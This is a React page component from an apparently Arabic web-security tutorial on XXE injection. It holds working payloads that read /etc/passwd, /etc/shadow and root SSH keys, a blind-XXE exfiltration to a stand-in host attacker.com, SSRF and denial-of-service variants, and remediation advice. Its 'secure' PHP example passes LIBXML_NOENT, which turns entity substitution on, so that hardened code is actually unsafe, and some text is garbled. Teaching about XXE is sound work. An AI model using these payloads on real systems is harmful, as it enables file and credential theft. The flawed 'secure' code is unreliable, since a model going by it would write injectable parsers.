import VulnerabilityLayout, { VulnSection, CodeBlock, InfoBox, ListItem } from '@/components/VulnerabilityLayout'
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'
import ShareButtons from '@/components/ShareButtons'

export default function XXEPage() {
  return (
    <VulnerabilityLayout
      icon="📄"
      titleAr="حقن XML بين الكيانات"
      titleEn="XML External Entity (XXE)"
      severity="critical"
      owasp="A5:2017"
    >
      <ShareButtons title="XXE - حقن XML بين الكيانات" url="https://web-security-guide.vercel.app/vulnerabilities/xxe" />

      <VulnSection title="تعريف XXE" icon="📖">
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8' }}>
          حقن XML بين الكيانات (XXE) هو ثغرة أمنية تسمح للمهاجم بإدخال كيانات XML مخصصة في بيانات الإدخال، مما قد يؤدي إلى قراءة ملفات داخلية أو تنفيذ أوامر عن بُعد.
        </p>
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8', marginTop: '8px' }}>
          تحدث الثغرة عندما يقوم محلل XML بتفعيل معالجة الكيانات الخارجية دون تصفية كافية.
        </p>
      </VulnSection>

      <VulnSection title="أنواع XXE" icon="🔍">
        <InfoBox type="warning">
          <strong>1. Classic XXE</strong> - يتم حقن كيان XML لقراءة ملفات محلية
        </InfoBox>
        <CodeBlock title="مثال على Classic XXE" code={`<!-- كيان XML مغرض -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>

<!-- قراءة ملفات Windows -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<user>&xxe;</user>`} />

        <InfoBox type="danger">
          <strong>2. Blind XXE</strong> - لا يتم عرض الاستجابة مباشرة، لكن يمكن سرقة البيانات عبر HTTP
        </InfoBox>
        <CodeBlock title="مثال على Blind XXE" code={`<!-- إرسال البيانات إلى خادم المهاجم -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<user>&send;</user>

<!-- evil.dtd على خادم المهاجم -->
<!ENTITY send SYSTEM "http://attacker.com/steal?data=%file;">`} />

        <InfoBox type="danger">
          <strong>3. SSRF عبر XXE</strong> - استخدام XXE للقيام بهجمات SSRF
        </InfoBox>
        <CodeBlock title="مثال على SSRF عبر XXE" code={`<!-- استخدام XXE للوصول لخدمات داخلية -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
]>
<user>&xxe;</user>`} />
      </VulnSection>

      <VulnSection title="أمثلة على الهجمات" icon="💻">
        <CodeBlock title="1. قراءة الملفات الحساسة" code={`<!-- قراءة /etc/shadow -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<user>&xxe;</user>

<!-- قراءة مفاتيح SSH -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
]>
<user>&xxe;</user>`} />

        <CodeBlock title="2. تصفح المجلدات" code={`<!-- تصفح محتويات المجلدات -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/">
]>
<user>&xxe;</user>`} />

        <CodeBlock title="3. Denial of Service" code={`<!-- هجوم Denial of Service -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/zero">
]>
<user>&xxe;</user>

<!-- استهلاك الموارد -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<user>&xxe;</user>`} />
      </VulnSection>

      <VulnSection title="أمثلة كود مصاب ومحصن" icon="💻">
        <CodeBlock title="❌ كود مصاب" variant="vulnerable" code={`// PHP - كود مصاب
$xml = simplexml_load_string($_POST['xml']);
echo $xml;

// Python - كود مصاب
import xml.etree.ElementTree as ET
tree = ET.parse('input.xml')
root = tree.getroot()`} />

        <CodeBlock title="✅ كود محصن" variant="secure" code={`// PHP - كود محصن
$dom = new DOMDocument();
libxml_disable_entity_loader(true);
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_NONET);
echo $dom->saveXML();

// Python - كود محstin
import defusedxml.ElementTree as ET
tree = ET.parse('input.xml')
root = tree.getroot()

// Java - كود محصن
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`} />
      </VulnSection>

      <VulnSection title="طرق الحماية" icon="🛡️">
        <InfoBox type="success">
          <strong>1. تعطيل معالجة الكيانات</strong> - عطل معالجة الكيانات الخارجية في محلل XML
        </InfoBox>
        <ListItem>استخدم libxml_disable_entity_loader(true) في PHP</ListItem>
        <ListItem>استخدم defusedxml في Python</ListItem>
        <ListItem>استخدم FEATURE_SECURE_PROCESSING في Java</ListItem>

        <InfoBox type="success">
          <strong>2. استخدام JSON بدلاً من XML</strong> - JSON آمن بشكل افتراضي من XXE
        </InfoBox>
        <ListItem>استبدل XML بـ JSON في واجهات برمجة التطبيقات</ListItem>
        <ListItem>استخدم Content-Type: application/json</ListItem>

        <InfoBox type="success">
          <strong>3. التصفية والتحقق</strong> - تحقق من محتوى XML قبل المعالجة
        </InfoBox>
        <ListItem>رفض أي XML يحتوي على كيانات خارجية</ListItem>
        <ListItem>استخدم Allowlist للسموح by الكيانات</ListItem>
      </VulnSection>

      <VulnSection title="نصائح أمنية" icon="💡">
        <InfoBox type="info">
          <strong>القاعدة الذهبية:</strong> عطل معالجة الكيانات الخارجية دائماً
        </InfoBox>
        <ListItem>استخدم مكتبات XML آمنة مثل defusedxml</ListItem>
        <ListItem>استبدل XML بـ JSON عندما يكون ممكناً</ListItem>
        <ListItem>تحقق من إعدادات الأمان في محلل XML</ListItem>
        <ListItem>راجع الكود بحثاً عن استخدامات XML غير آمنة</ListItem>
      </VulnSection>

      <VulnSection title="الأخطاء الشائعة" icon="⚠️">
        <InfoBox type="danger">
          <strong>❌ استخدام XML مع معالجة الكيانات الافتراضية</strong> - الافتراضي عادة ما يكون غير آمن
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ عدم تصفية محتوى XML</strong> - يمكن حقن أي كيان XML في المدخلات
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ استخدام XML القديم</strong> - الإصدارات القديمة قد لا تحتوي على إصلاحات أمنية
        </InfoBox>
      </VulnSection>

      <section className="mb-6">
        <LabsSection slug="xxe" />
      </section>

      <section className="mb-6">
        <ToolsSection slug="xxe" />
      </section>

      <section className="mb-6">
        <Quiz slug="xxe" />
        <VideoSection slug="xxe" />
      </section>
    </VulnerabilityLayout>
  )
}
